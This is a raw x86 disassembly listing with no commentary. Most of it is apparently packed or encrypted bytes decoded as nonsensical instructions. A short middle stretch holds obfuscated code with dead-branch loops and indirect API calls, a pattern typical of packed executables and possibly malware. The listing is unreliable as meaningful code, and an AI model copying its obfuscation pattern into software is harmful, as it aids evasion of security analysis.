  406a01:	push   esp
  406a02:	int    0x2
  406a04:	mov    ds,WORD PTR [ecx-0x75]
  406a07:	stos   BYTE PTR es:[edi],al
  406a08:	or     ecx,DWORD PTR [ecx]
  406a0a:	inc    edx
  406a0b:	xor    DWORD PTR [ecx],edx
  406a0d:	mov    WORD PTR [ebp+0x5aa140af],?
  406a13:	jb     0x4069b1
  406a15:	jne    0x406a85
  406a17:	cwde   
  406a18:	enter  0x69f0,0x64
  406a1c:	shr    ebp,0x6e
  406a1f:	jne    0x4069a7
  406a21:	jl     0x406a42
  406a23:	into   
  406a24:	add    DWORD PTR [esp+eiz*2-0x66],esp
  406a28:	nop
  406a29:	xor    DWORD PTR [esi],ebx
  406a2b:	fdivr  st(0),st
  406a2d:	mov    DWORD PTR [esp+eiz*2],0x8b4ef549
  406a34:	sti    
  406a35:	adc    al,0x44
  406a37:	sar    BYTE PTR [ecx-0x54],cl
  406a3a:	sbb    bh,BYTE PTR [eax-0xd72633e]
  406a40:	popf   
  406a41:	dec    eax
  406a42:	fisub  DWORD PTR [esi+0x7d0ffc10]
  406a48:	outs   dx,BYTE PTR ds:[esi]
  406a49:	cld    
  406a4a:	inc    ebx
  406a4b:	int3   
  406a4c:	stos   DWORD PTR es:[edi],eax
  406a4d:	and    BYTE PTR [edi],ah
  406a4f:	(bad)  
  406a50:	xchg   edi,eax
  406a51:	push   es
  406a52:	leave  
  406a53:	push   ds
  406a54:	and    BYTE PTR [esi+0x29],0x2d
  406a58:	jne    0x4069fa
  406a5a:	inc    eax
  406a5b:	or     ch,cl
  406a5d:	jg     0x406ad4
  406a5f:	xor    BYTE PTR [eax-0xdf6c865],dh
  406a65:	bound  esp,QWORD PTR [esi-0x41]
  406a68:	jb     0x406a9e
  406a6a:	js     0x406a69
  406a6c:	jle    0x406a89
  406a6e:	(bad)  
  406a6f:	mov    edi,0x8ca8f066
  406a74:	pushf  
  406a75:	xor    DWORD PTR [edx-0x73582c57],edx
  406a7b:	mov    BYTE PTR [eax],al
  406a7d:	add    esp,ebp
  406a7f:	pop    ebx
  406a80:	add    BYTE PTR [ecx-0x2ce3d800],al
  406a86:	int3   
  406a87:	pusha  
  406a88:	add    esp,ecx
  406a8a:	mov    esp,0xe9ebc30a
  406a8f:	nop
  406a90:	jmp    0x4a3cc906
  406a95:	xchg   edi,eax
  406a96:	push   edi
  406a97:	xlat   BYTE PTR ds:[ebx]
  406a98:	cmp    ebp,DWORD PTR [ebp-0x6cae0f91]
  406a9e:	std    
  406a9f:	jmp    0x12763ab1
  406aa4:	pop    ebx
  406aa5:	cmp    BYTE PTR [eax+0x71],dh
  406aa8:	cmp    DWORD PTR [ecx+0x52],ebx
  406aab:	add    eax,0xc9bcbb10
  406ab0:	dec    ecx
  406ab1:	test   DWORD PTR [ecx+0x7e0df49c],esp
  406ab7:	ror    BYTE PTR [esi+0x47be08c8],1
  406abd:	in     eax,0xf6
  406abf:	pop    ss
  406ac0:	dec    esp
  406ac1:	sbb    edi,0x9f4c0926
  406ac7:	jb     0x406ac5
  406ac9:	cdq    
  406aca:	jbe    0x406b2f
  406acc:	cld    
  406acd:	(bad)  
  406acf:	inc    esi
  406ad0:	pusha  
  406ad1:	les    ebx,FWORD PTR [edx+esi*2+0x23]
  406ad5:	mov    ebp,0x5dac5fc6
  406ada:	add    edx,DWORD PTR [edx+0x7a]
  406add:	dec    ebx
  406ade:	push   ds
  406adf:	adc    DWORD PTR [ebx-0xb71beac],ebp
  406ae5:	das    
  406ae6:	repz sahf 
  406ae8:	sub    BYTE PTR [edx+0x6047e9cb],dh
  406aee:	xchg   esp,eax
  406aef:	mov    al,0xe7
  406af1:	aad    0xf0
  406af3:	and    BYTE PTR [ebp+0x2bffaf44],dl
  406af9:	aas    
  406afa:	or     cl,dl
  406afc:	and    esp,DWORD PTR [edi]
  406afe:	jb     0x406b67
  406b00:	daa    
  406b01:	outs   dx,BYTE PTR ds:[si]
  406b03:	xor    esi,DWORD PTR [edx+0x420f9762]
  406b09:	jg     0x406b37
  406b0b:	test   BYTE PTR [ecx],ah
  406b0d:	js     0x406ae5
  406b0f:	add    BYTE PTR [ebx-0x4328cba5],0xa6
  406b16:	sar    DWORD PTR [esi],1
  406b18:	sbb    al,0xc
  406b1a:	shl    DWORD PTR [edx+eax*1-0x78],0x58
  406b1f:	add    BYTE PTR [ebx+eiz*4],dl
  406b22:	xor    eax,0xf4c85b63
  406b27:	adc    al,0xe2
  406b29:	inc    ecx
  406b2a:	cdq    
  406b2b:	jmp    0x406b9a
  406b2d:	test   eax,0x7d916c1a
  406b32:	lahf   
  406b33:	daa    
  406b34:	pop    ebx
  406b35:	sti    
  406b36:	pop    eax
  406b37:	sub    ecx,DWORD PTR ds:0x2e2e3858
  406b3d:	inc    eax
  406b3e:	pop    ds
  406b3f:	sti    
  406b40:	inc    esp
  406b41:	popa   
  406b42:	fild   DWORD PTR [ebx+edx*4+0x385fbfa9]
  406b49:	inc    esi
  406b4a:	fs mov dh,0xe6
  406b4d:	jp     0x406b8c
  406b4f:	sti    
  406b50:	and    bh,0x74
  406b53:	xlat   BYTE PTR ds:[ebx]
  406b54:	pop    ebp
  406b55:	test   eax,0xed06910b
  406b5a:	mov    ds:0x45d6fcf6,al
  406b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b60:	adc    BYTE PTR [ecx-0x40],al
  406b63:	cdq    
  406b64:	(bad)  
  406b65:	wrmsr  
  406b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b68:	je     0x406b23
  406b6a:	xchg   esi,edx
  406b6c:	xor    BYTE PTR [ebx],bl
  406b6e:	pop    ss
  406b6f:	mov    bl,0x7f
  406b71:	pop    ds
  406b72:	ins    BYTE PTR es:[edi],dx
  406b73:	outs   dx,DWORD PTR ds:[esi]
  406b74:	imul   esi,DWORD PTR [edx+0x424ad2dc],0x4
  406b7b:	or     al,BYTE PTR [ebx-0xb7036b2]
  406b81:	imul   eax,DWORD PTR [esi+0x1b],0xd6db226a
  406b88:	ins    DWORD PTR es:[edi],dx
  406b89:	int    0x6
  406b8b:	add    DWORD PTR [eax],0x42
  406b8e:	sub    esi,DWORD PTR [ebp+ebx*8-0x58]
  406b92:	pop    edi
  406b93:	cs inc ebp
  406b95:	mov    ecx,0xc6edbf83
  406b9a:	imul   ebp,DWORD PTR ds:0xab3cdc8,0x82a8a0a3
  406ba4:	jle    0x406c23
  406ba6:	enter  0x58c8,0x71
  406baa:	cmp    edx,DWORD PTR [edi]
  406bac:	(bad)  
  406bad:	adc    al,0xea
  406baf:	dec    BYTE PTR [ebx-0x21]
  406bb2:	outs   dx,DWORD PTR ds:[esi]
  406bb3:	cld    
  406bb4:	and    ebp,DWORD PTR [ebx+0x5]
  406bb7:	fwait
  406bb8:	inc    edx
  406bb9:	sub    al,BYTE PTR [ebp+0x1]
  406bbc:	sbb    ah,BYTE PTR [ecx]
  406bbe:	push   edx
  406bbf:	jae    0x406c1e
  406bc1:	int    0x8e
  406bc3:	js     0x406c0c
  406bc5:	scas   al,BYTE PTR es:[edi]
  406bc6:	cmp    edx,esi
  406bc8:	sub    al,0x8c
  406bca:	cmp    al,0xd3
  406bcc:	mov    ah,0x73
  406bce:	outs   dx,BYTE PTR ds:[esi]
  406bcf:	clc    
  406bd0:	xchg   ebx,eax
  406bd1:	cmp    eax,0x7c98cd54
  406bd6:	xor    al,bl
  406bd8:	xchg   edx,eax
  406bd9:	(bad)  
  406bdb:	pop    es
  406bdc:	xchg   ecx,eax
  406bdd:	xchg   ebx,eax
  406bde:	add    al,0x24
  406be0:	stos   WORD PTR es:[edi],ax
  406be2:	inc    ebp
  406be3:	inc    ebx
  406be4:	std    
  406be5:	int3   
  406be6:	inc    edi
  406be7:	je     0x406b6c
  406be9:	or     bh,al
  406beb:	mov    cl,0xf
  406bed:	mov    ch,0xc4
  406bef:	inc    ecx
  406bf0:	mov    esp,0xdcff8c6f
  406bf5:	in     eax,dx
  406bf6:	xor    dh,dh
  406bf8:	push   esi
  406bf9:	jl     0x406c45
  406bfb:	lock sub eax,0xc86d6a35
  406c01:	sbb    eax,esp
  406c03:	xor    BYTE PTR [ebx+ecx*8+0x28],0x6b
  406c08:	mov    al,0xc
  406c0a:	call   0x22650fbc
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	mov    ebp,0x38c7d984
  406c2c:	retf   0x7e7e
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	gs iret 
  406c35:	mov    ecx,0x3eb04b59
  406c3a:	into   
  406c3b:	(bad)  
  406c3c:	jmp    0x406bcb
  406c3e:	or     ah,BYTE PTR [ebx]
  406c40:	push   esi
  406c41:	and    BYTE PTR [edx-0xe],cl
  406c44:	xor    bh,ch
  406c46:	sub    DWORD PTR [edx],ebp
  406c48:	shl    DWORD PTR [esp+ebx*4-0x7858f436],cl
  406c4f:	jp     0x406c75
  406c51:	push   esi
  406c52:	jnp    0x406ca4
  406c54:	inc    ebx
  406c55:	push   esi
  406c56:	dec    ecx
  406c57:	add    al,0x84
  406c59:	in     eax,dx
  406c5a:	ins    BYTE PTR es:[edi],dx
  406c5b:	aas    
  406c5c:	shl    BYTE PTR [edi],0x17
  406c5f:	lahf   
  406c60:	pop    eax
  406c61:	repz jge 0x406c65
  406c64:	mov    cs,WORD PTR [ebx-0x48]
  406c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c68:	daa    
  406c69:	(bad)  
  406c6a:	imul   ebp,DWORD PTR [ebp+edx*8+0x52],0x5647fe43
  406c72:	adc    BYTE PTR [ecx+0x76],ch
  406c75:	sub    eax,0xa50b9aa6
  406c7a:	out    0xb2,al
  406c7c:	xchg   esp,eax
  406c7d:	ror    esi,0x9a
  406c80:	bound  ecx,QWORD PTR [ebp+0x50]
  406c83:	call   0x4071:0x2432854c
  406c8a:	or     bh,BYTE PTR [ebx+0x2c28f8b9]
  406c90:	mov    ebx,DWORD PTR [ebx-0x2d554db]
  406c96:	test   al,0x8b
  406c98:	in     al,0xf0
  406c9a:	cmp    ah,BYTE PTR [ecx+ebp*4-0x7a]
  406c9e:	add    al,0x98
  406ca0:	sbb    eax,0xfed9be16
  406ca5:	mov    bh,0x97
  406ca7:	dec    edx
  406ca8:	mov    dh,0xbd
  406caa:	mov    bh,0x49
  406cac:	mul    BYTE PTR [edx-0x27443a1c]
  406cb2:	ds and al,0x30
  406cb5:	outs   dx,BYTE PTR ds:[esi]
  406cb6:	cdq    
  406cb7:	cmp    bh,dh
  406cb9:	add    al,0xdd
  406cbb:	fadd   QWORD PTR [edx+edx*2+0x7f]
  406cbf:	dec    esi
  406cc0:	popa   
  406cc1:	in     al,dx
  406cc2:	mov    ebx,0xb8c971e9
  406cc7:	cmp    edi,DWORD PTR cs:[eax]
  406cca:	aas    
  406ccb:	adc    esp,ebp
  406ccd:	lahf   
  406cce:	stos   DWORD PTR es:[edi],eax
  406ccf:	jg     0x406cea
  406cd1:	test   bl,ch
  406cd3:	ror    BYTE PTR [ebx+0x1893bf9d],cl
  406cd9:	pop    ebx
  406cda:	cwde   
  406cdb:	inc    eax
  406cdc:	jo     0x406c63
  406cde:	adc    bh,BYTE PTR [esi]
  406ce0:	pop    ebx
  406ce1:	test   BYTE PTR [edi-0x10764754],cl
  406ce7:	addr16 arpl sp,sp
  406cea:	fwait
  406ceb:	clc    
  406cec:	and    eax,0xfd7e1a67
  406cf1:	ds add ebx,edi
  406cf4:	xchg   edx,eax
  406cf5:	icebp  
  406cf6:	push   esp
  406cf7:	mov    edx,0xbe03d832
  406cfc:	sub    al,0x48
  406cfe:	ror    BYTE PTR [edi+eax*8],cl
  406d01:	pop    ebx
  406d02:	lock sub BYTE PTR [esi+edi*1-0x73e92b56],bh
  406d0a:	jae    0x406cbf
  406d0c:	(bad)  
  406d0d:	mov    ecx,0x8768ede5
  406d12:	mov    DWORD PTR [esi],0x2a119692
  406d18:	(bad)  
  406d19:	jmp    0x406d26
  406d1b:	or     dl,BYTE PTR [edi-0x6ece0bc5]
  406d21:	push   edi
  406d22:	repnz dec ecx
  406d24:	ins    BYTE PTR es:[edi],dx
  406d25:	xor    al,0xf5
  406d27:	pusha  
  406d28:	mov    fs,WORD PTR [ebp-0x6d016330]
  406d2e:	and    ebx,DWORD PTR ds:0xa33f6c30
  406d34:	loopne 0x406db4
  406d36:	std    
  406d37:	adc    eax,0x492dcaa0
  406d3c:	pushf  
  406d3d:	fsub   st,st(7)
  406d3f:	enter  0x9fab,0x58
  406d43:	or     eax,0x86230a8b
  406d48:	mov    ch,0x56
  406d4a:	sub    al,0xe8
  406d4c:	xor    ebx,DWORD PTR [edx]
  406d4e:	pop    edi
  406d4f:	cmc    
  406d50:	sub    eax,0x9e31143b
  406d55:	fbld   TBYTE PTR [edi-0x2d]
  406d58:	mov    ?,WORD PTR [edx]
  406d5a:	popf   
  406d5b:	xor    al,BYTE PTR ds:0x5e1cd304
  406d61:	repz lock inc eax
  406d64:	stc    
  406d65:	inc    esp
  406d66:	mov    cl,0xa0
  406d68:	int3   
  406d69:	out    0xe6,eax
  406d6b:	test   eax,0x54846012
  406d70:	rdpmc  
  406d72:	inc    esi
  406d73:	mov    DWORD PTR [esi-0x47a07361],eax
  406d79:	mov    cl,0xa8
  406d7b:	das    
  406d7c:	jmp    0x406dd9
  406d7e:	(bad)  
  406d7f:	pop    ebx
  406d80:	jle    0x406db5
  406d82:	mov    edx,0xe5d503b0
  406d87:	mov    ds:0xd761b82e,eax
  406d8c:	ficomp DWORD PTR [ebx+0x39]
  406d8f:	jo     0x406df2
  406d91:	gs inc eax
  406d93:	add    al,0x6c
  406d95:	xchg   edi,eax
  406d96:	fsubr  DWORD PTR [ebx]
  406d98:	jge    0x406da3
  406d9a:	test   BYTE PTR [ebx-0xf],ah
  406d9d:	cld    
  406d9e:	mov    al,0x2e
  406da0:	retf   0xad14
  406da3:	dec    edx
  406da4:	bnd ret 
  406da6:	pop    ebx
  406da7:	push   0xffffff8e
  406da9:	mov    esi,0x294269dc
  406dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406daf:	xor    edx,eax
  406db1:	push   es
  406db2:	sar    DWORD PTR [esi-0x4dc3ecd4],1
  406db8:	inc    ebp
  406db9:	and    esi,DWORD PTR [esi+0x1b]
  406dbc:	add    ah,BYTE PTR [esi]
  406dbe:	xor    DWORD PTR [esi+0x79],eax
  406dc1:	popa   
  406dc2:	sar    BYTE PTR [edx+ecx*2],1
  406dc5:	fdiv   st,st(4)
  406dc7:	cmp    ch,BYTE PTR [ecx]
  406dc9:	add    al,0xdf
  406dcb:	out    0x17,al
  406dcd:	and    al,BYTE PTR [edi-0x43855d78]
  406dd3:	mov    dh,cl
  406dd5:	inc    ebp
  406dd6:	add    DWORD PTR [esi+0x2b],edx
  406dd9:	hlt    
  406dda:	inc    edx
  406ddb:	ss inc ecx
  406ddd:	ja     0x406dff
  406ddf:	jne    0x406d98
  406de1:	imul   ebx,ecx,0xffffffe2
  406de4:	ja     0x406da9
  406de6:	jge    0x406dcc
  406de8:	loopne 0x406e14
  406dea:	inc    ebx
  406deb:	xchg   DWORD PTR [ecx+0x56],edi
  406dee:	(bad)  
  406def:	push   ecx
  406df0:	adc    eax,0xcd5160cd
  406df5:	daa    
  406df6:	pop    ss
  406df7:	xor    esp,ebp
  406df9:	mov    ch,BYTE PTR [edi+0x3b141b95]
  406dff:	jb     0x406e30
  406e01:	dec    ebx
  406e02:	shl    DWORD PTR [ebp-0x6d8ed4a4],cl
  406e08:	pop    ds
  406e09:	imul   ebx,DWORD PTR [ecx-0x1b3ebe17],0x9237266
  406e13:	jecxz  0x406e66
  406e15:	fisttp DWORD PTR [ebx]
  406e17:	sar    DWORD PTR [ecx],cl
  406e19:	xchg   DWORD PTR [edi],ecx
  406e1b:	repz jnp 0x406deb
  406e1e:	cmp    BYTE PTR fs:[ebp-0x6e],cl
  406e22:	pop    eax
  406e23:	dec    edi
  406e24:	or     DWORD PTR [edi],edx
  406e26:	xchg   ecx,eax
  406e27:	and    edx,esi
  406e29:	mov    al,0xbb
  406e2b:	inc    ebp
  406e2c:	mov    bl,0x1d
  406e2e:	push   edx
  406e2f:	push   ecx
  406e30:	daa    
  406e31:	call   0xfd9e394a
  406e36:	or     al,0x25
  406e38:	iret   
  406e39:	jg     0x406e96
  406e3b:	pop    ebp
  406e3c:	dec    edx
  406e3d:	pop    esi
  406e3e:	xor    BYTE PTR [eax+0x5f],ch
  406e41:	pusha  
  406e42:	and    DWORD PTR [ecx],0xffffffc6
  406e45:	(bad)  
  406e46:	mov    edx,0x3bc8ba78
  406e4b:	shl    DWORD PTR [ebx+edi*2+0x55e50546],cl
  406e52:	cmp    ch,dl
  406e54:	sub    al,BYTE PTR [ebx]
  406e56:	pop    esi
  406e57:	pushf  
  406e58:	(bad)  
  406e59:	fwait
  406e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5b:	jg     0x406e84
  406e5d:	pop    esi
  406e5e:	push   eax
  406e5f:	mov    ebx,0x66ea4b4
  406e64:	das    
  406e65:	dec    ebx
  406e66:	xor    cl,BYTE PTR [esp+ecx*4-0x11]
  406e6a:	test   BYTE PTR ds:0x8e9c6de9,dl
  406e70:	sbb    DWORD PTR [edx+0x6316bfb],ebp
  406e76:	les    eax,FWORD PTR [esi]
  406e78:	pushf  
  406e79:	adc    ebp,DWORD PTR [esi+0x461a6e8a]
  406e7f:	dec    eax
  406e80:	inc    esp
  406e81:	retf   0x221b
  406e84:	inc    edx
  406e85:	fcmove st,st(1)
  406e87:	aaa    
  406e88:	lahf   
  406e89:	jae    0x406e0f
  406e8b:	xchg   bh,bl
  406e8d:	loope  0x406ef3
  406e8f:	fcomp  DWORD PTR [esi+0x4a]
  406e92:	adc    eax,0xb8f5bf69
  406e97:	icebp  
  406e98:	add    BYTE PTR [ecx+0x1d],dl
  406e9b:	push   ebp
  406e9c:	stos   BYTE PTR es:[edi],al
  406e9d:	fistp  WORD PTR [ebx+0x173c480f]
  406ea3:	out    0xbf,al
  406ea5:	sbb    edi,DWORD PTR [eax+0x1d]
  406ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ea9:	or     cl,ch
  406eab:	xlat   BYTE PTR ds:[ebx]
  406eac:	cmp    edx,DWORD PTR [ebx]
  406eae:	cmp    eax,0xcb747262
  406eb3:	pop    ecx
  406eb4:	jae    0x406edc
  406eb6:	call   0xbcf4d9a9
  406ebb:	push   ss
  406ebc:	fisubr DWORD PTR [ecx+0x23ea0e0a]
  406ec2:	xchg   BYTE PTR [edi],dh
  406ec4:	pop    es
  406ec5:	adc    edx,DWORD PTR [eax-0x38]
  406ec8:	xchg   DWORD PTR [edi+0x18],edi
  406ecb:	fild   QWORD PTR [eax-0x45]
  406ece:	ds enter 0xc23e,0x82
  406ed3:	mov    bh,BYTE PTR [ecx]
  406ed5:	xor    edx,0x1452da60
  406edb:	adc    dl,bh
  406edd:	xor    bl,ah
  406edf:	leave  
  406ee0:	ficomp DWORD PTR [ecx-0x80]
  406ee3:	int3   
  406ee4:	in     al,dx
  406ee5:	jecxz  0x406f4c
  406ee7:	push   edx
  406ee8:	sub    ecx,DWORD PTR [edi+0x39139d86]
  406eee:	ss pop ds
  406ef0:	call   0x7c4b:0x9def0bb9
  406ef7:	les    esp,FWORD PTR [edx-0x1c]
  406efa:	pop    ebp
  406efb:	sti    
  406efc:	aaa    
  406efd:	loop   0x406e95
  406eff:	dec    esp
  406f00:	mov    bh,0xe5
  406f02:	repz sub DWORD PTR [esi],ebp
  406f05:	adc    DWORD PTR [edx+0x73],ecx
  406f08:	mov    dl,0x55
  406f0a:	add    al,0x77
  406f0c:	cdq    
  406f0d:	retf   
  406f0e:	or     dl,bl
  406f10:	or     DWORD PTR [ecx+0x6b],ebx
  406f13:	(bad)  
  406f14:	mov    ch,0x41
  406f16:	(bad)  
  406f17:	mov    bl,0xc7
  406f19:	ret    0xae7b
  406f1c:	(bad)  
  406f1d:	xlat   BYTE PTR ds:[ebx]
  406f1e:	(bad)  
  406f1f:	pop    eax
  406f20:	inc    ecx
  406f21:	sub    BYTE PTR [ebp+0x5e],bl
  406f24:	xchg   BYTE PTR [esi+eiz*8+0x5f],al
  406f28:	(bad)  
  406f29:	fistp  QWORD PTR [eax-0xc8200db]
  406f2f:	push   esi
  406f30:	retf   
  406f31:	mov    ebx,0x632fd0a4
  406f36:	shl    DWORD PTR [ebx+0x6f10128],1
  406f3c:	pop    ecx
  406f3d:	arpl   WORD PTR [eax],ax
  406f3f:	int3   
  406f40:	inc    esi
  406f41:	mov    edi,ecx
  406f43:	lock sub eax,0x9807b94c
  406f49:	(bad)  
  406f4a:	in     eax,dx
  406f4b:	cwde   
  406f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4d:	add    esp,ebx
  406f4f:	rcr    BYTE PTR [ecx],0xf8
  406f52:	je     0x406f92
  406f54:	adc    ah,BYTE PTR [eax+0x41]
  406f57:	sub    ah,ch
  406f59:	mov    ebx,0xa4cd6d4
  406f5e:	pushf  
  406f5f:	mov    ecx,0x21a7797d
  406f64:	inc    ebp
  406f65:	or     DWORD PTR [ebx-0x790cd74b],edi
  406f6b:	add    DWORD PTR [edi+esi*4],edx
  406f6e:	retf   0xf57d
  406f71:	and    eax,DWORD PTR [edx+eax*2-0x13212310]
  406f78:	(bad)  
  406f79:	jg     0x406f47
  406f7b:	cwde   
  406f7c:	pop    ecx
  406f7d:	or     edx,DWORD PTR [eax]
  406f7f:	add    edx,DWORD PTR [ebx-0x6f17285d]
  406f85:	mov    bl,0xaf
  406f87:	push   cs
  406f88:	cmp    eax,0x90d63427
  406f8d:	jmp    0x9e9effc9
  406f92:	enter  0x9b6b,0x1c
  406f96:	sub    al,0x55
  406f98:	repnz aas 
  406f9a:	push   ebp
  406f9b:	dec    esi
  406f9c:	inc    edi
  406f9d:	jo     0x40701a
  406f9f:	lea    eax,[ebx]
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430516,0x19
  406fd8:	cmp    DWORD PTR ds:0x430516,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430516,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eb44
  406ffd:	cmp    DWORD PTR ds:0x430516,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430516
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430516,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430516
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430516,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x4305d6,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x4305ca,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee98,0x42eea0
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee90,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee9c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee9c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee9c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee9c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42ec24
  4070a9:	cmp    DWORD PTR ds:0x42ee9c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee9c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee9c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee9c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x4305da,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42eea8,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42eea8
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42eea8,ecx
  4070fe:	cmp    DWORD PTR ds:0x42eea8,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42eea8,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42eea4
  407123:	call   DWORD PTR ds:0x42ec28
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x43053a
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430512,0x17
  407147:	cmp    DWORD PTR ds:0x430512,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430512,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea84
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430512
  407179:	dec    eax
  40717a:	mov    ds:0x430512,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xe56b3896
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407228
  4071b2:	addr16 cmp eax,0x46b4a2fc
  4071b8:	push   edi
  4071b9:	push   ebp
  4071ba:	(bad)
  4071bd:	adc    BYTE PTR ds:0xff703298,0x6a
  4071c4:	push   ebp
  4071c5:	div    DWORD PTR [edx+0x374dbd6a]
  4071cb:	sbb    eax,0x7118fb82
  4071d0:	jae    0x40723a
  4071d2:	(bad)  
  4071d3:	retf   
  4071d4:	mov    DWORD PTR [eax-0x368618f8],edx
  4071da:	mov    eax,ds:0x93e06e82
  4071df:	cmp    al,0x74
  4071e1:	jp     0x407223
  4071e3:	(bad)
  4071e6:	sbb    BYTE PTR [ebx+0x5d5800ee],dl
  4071ec:	(bad)  
  4071ed:	jmp    0xba5e:0x2a2c27ab
  4071f4:	cmp    esp,eax
  4071f6:	stos   DWORD PTR es:[edi],eax
  4071f7:	ficomp DWORD PTR ds:[ebx+edi*4-0x11cfa4e4]
  4071ff:	test   BYTE PTR [ebp+edi*1-0x35],dh
  407203:	test   al,0xf1
  407205:	addr16 dec ebp
  407207:	jmp    0x36d32079
  40720c:	mov    esp,DWORD PTR [eax-0x224ef67b]
  407212:	icebp  
  407213:	pushf  
  407214:	icebp  
  407215:	lock mul DWORD PTR [eax+edx*8-0x420e6347]
  40721d:	cmp    edi,esi
  40721f:	or     BYTE PTR [ecx-0x4ddb2fbd],dh
  407225:	ror    DWORD PTR [esi-0x2cf59828],1
  40722b:	mov    eax,0x5a5fc4fb
  407230:	popa   
  407231:	cmp    eax,ebx
  407233:	inc    edi
  407234:	aaa    
  407235:	pop    esp
  407236:	test   esi,ecx
  407238:	mov    dh,0xa
  40723a:	jns    0x4072bb
  40723c:	in     eax,0x69
  40723e:	pop    esp
  40723f:	jmp    0xdc2f:0x306b1ed8
  407246:	mov    dh,ch
  407248:	sub    esp,ebp
  40724a:	rol    DWORD PTR [edi+0x24],cl
  40724d:	or     eax,0xd450d4c5
  407252:	addr16 and eax,0x3731e54b
  407258:	jmp    0x252:0xf8c71317
  40725f:	jge    0x4072dc
  407261:	lea    ecx,[edi+0x1866dc9a]
  407267:	ds xchg esi,eax
  407269:	dec    esp
  40726a:	popa   
  40726b:	repnz shl DWORD PTR [ecx],cl
  40726e:	pop    esi
  40726f:	xchg   ebx,eax
  407270:	in     eax,0xcf
  407272:	pop    esp
  407273:	mov    edx,0xf012b351
  407278:	pop    eax
  407279:	and    BYTE PTR ds:0x875970a6,dh
